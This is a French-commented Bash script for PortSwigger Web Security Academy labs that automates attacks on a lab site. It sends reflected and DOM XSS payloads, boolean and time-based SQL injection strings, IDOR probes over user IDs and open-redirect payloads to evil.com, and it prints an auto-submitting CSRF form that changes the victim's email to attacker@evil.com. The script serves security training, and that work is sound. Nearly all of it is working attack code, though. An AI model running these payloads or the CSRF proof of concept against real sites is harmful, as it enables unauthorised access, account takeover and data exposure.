#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
COOKIE="session=<your-session-cookie>"
EMAIL="attacker@evil.com"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Analyse et test XSS (reflected/stored)
test_xss() {
    print_sep
    echo "[XSS] Analyse, attaque et contrôle"
    PAYLOADS=(
        "<script>alert(1)</script>"
        "\"><svg/onload=alert(1)>"
        "<img src=x onerror=alert(1)>"
    )
    for payload in "${PAYLOADS[@]}"; do
        url="$TARGET_URL/?search=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")"
        resp=$(curl -sk "$url")
        if echo "$resp" | grep -q "$payload"; then
            echo "  [+] Payload reflété : $url"
            echo "      => Testez dans le navigateur, cherchez une alerte JS."
        else
            echo "  [-] Non reflété : $url"
        fi
    done
    echo "  [Contrôle] : Si une alerte JS apparaît, la faille XSS est confirmée."
}

# 2. Analyse et test SQL Injection (SQLi)
test_sqli() {
    print_sep
    echo "[SQLi] Analyse, attaque et contrôle"
    INJECTIONS=("' OR 1=1--" "' OR 'a'='a" "' OR SLEEP(5)--")
    for inj in "${INJECTIONS[@]}"; do
        url="$TARGET_URL/?category=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$inj'''))")"
        time_start=$(date +%s)
        resp=$(curl -sk "$url")
        time_end=$(date +%s)
        dt=$((time_end-time_start))
        if [[ $dt -ge 5 ]]; then
            echo "  [+] Délai détecté (possible time-based SQLi) : $url"
        elif [[ "$resp" =~ "Welcome" || "$resp" =~ "admin" ]]; then
            echo "  [+] Résultat anormal (possible Boolean-based SQLi) : $url"
        else
            echo "  [-] Pas d'indicateur SQLi évident : $url"
        fi
    done
    echo "  [Contrôle] : Si vous obtenez un accès non autorisé ou un délai, la faille SQLi est probable."
}

# 3. Analyse et test CSRF
test_csrf() {
    print_sep
    echo "[CSRF] Analyse, attaque et contrôle"
    CSRF_PATH="/my-account/change-email"
    html=$(curl -sk -b "$COOKIE" "$TARGET_URL$CSRF_PATH")
    if echo "$html" | grep -qi "csrf"; then
        echo "  [INFO] Token CSRF détecté dans le formulaire."
    else
        echo "  [ALERTE] Aucun token CSRF détecté !"
        echo "  => Génération d'une PoC à tester dans le navigateur :"
        cat <<EOF
<!DOCTYPE html>
<html>
  <body>
    <form action="$TARGET_URL$CSRF_PATH" method="POST">
      <input type="hidden" name="email" value="$EMAIL">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
EOF
    fi
    echo "  [Contrôle] : Si l'action est réalisée sans token, la faille CSRF est confirmée."
}

# 4. Analyse et test IDOR (Insecure Direct Object Reference)
test_idor() {
    print_sep
    echo "[IDOR] Analyse, attaque et contrôle"
    USER_IDS=("wiener" "carlos" "administrator" "1" "2")
    for id in "${USER_IDS[@]}"; do
        url="$TARGET_URL/my-account?id=$id"
        resp=$(curl -sk -b "$COOKIE" "$url")
        if echo "$resp" | grep -qi "username\|email\|account"; then
            echo "  [+] Accès à $id possible : $url"
        else
            echo "  [-] Accès refusé ou page vide : $url"
        fi
    done
    echo "  [Contrôle] : Si vous accédez aux données d'un autre utilisateur, la faille IDOR est confirmée."
}

# 5. Analyse et test Open Redirect
test_open_redirect() {
    print_sep
    echo "[Open Redirect] Analyse, attaque et contrôle"
    REDIR_PATH="/redirect?url="
    PAYLOADS=("https://evil.com" "//evil.com" "/\\evil.com")
    for payload in "${PAYLOADS[@]}"; do
        url="$TARGET_URL$REDIR_PATH$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")"
        resp=$(curl -sk -I "$url")
        if echo "$resp" | grep -qi "Location: $payload"; then
            echo "  [+] Redirection externe détectée : $url"
        else
            echo "  [-] Pas de redirection externe : $url"
        fi
    done
    echo "  [Contrôle] : Si la redirection externe fonctionne, la faille est confirmée."
}

# 6. Analyse, attaque et contrôle DOM-based XSS
test_domxss() {
    print_sep
    echo "[DOM XSS] Analyse, attaque et contrôle"
    html=$(curl -sk "$TARGET_URL")
    if echo "$html" | grep -q "location.search"; then
        echo "  [!] Source location.search détectée."
        PAYLOAD="<img src=x onerror=alert('domxss')>"
        url="$TARGET_URL/?search=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")"
        echo "  [PoC] $url"
        echo "  [Contrôle] : Ouvrez ce lien dans un navigateur, si une alerte JS apparaît la faille est confirmée."
    else
        echo "  [-] Pas de source DOM XSS évidente détectée."
    fi
}

# 7. Synthèse et conseils
print_summary() {
    print_sep
    echo "[SYNTHÈSE ESSENTIAL SKILLS]"
    echo "1. Pour chaque type de vulnérabilité, le script propose une analyse, une attaque et un contrôle."
    echo "2. Pour XSS/DOM XSS, ouvrez les liens dans un navigateur pour valider l'exploit."
    echo "3. Pour CSRF, testez la PoC HTML dans le navigateur connecté."
    echo "4. Pour SQLi et IDOR, analysez les réponses pour détecter un comportement anormal."
    echo "5. Pour Open Redirect, vérifiez la présence du header Location."
    echo "6. Utilisez Burp Suite pour automatiser et approfondir l'analyse."
    echo "Documentation PortSwigger : https://portswigger.net/web-security"
    print_sep
}

# Exécution séquentielle
echo "=== Script PortSwigger Essential Skills : analyse, attaque et contrôle ==="
test_xss
test_domxss
test_sqli
test_csrf
test_idor
test_open_redirect
print_summary

# End of script
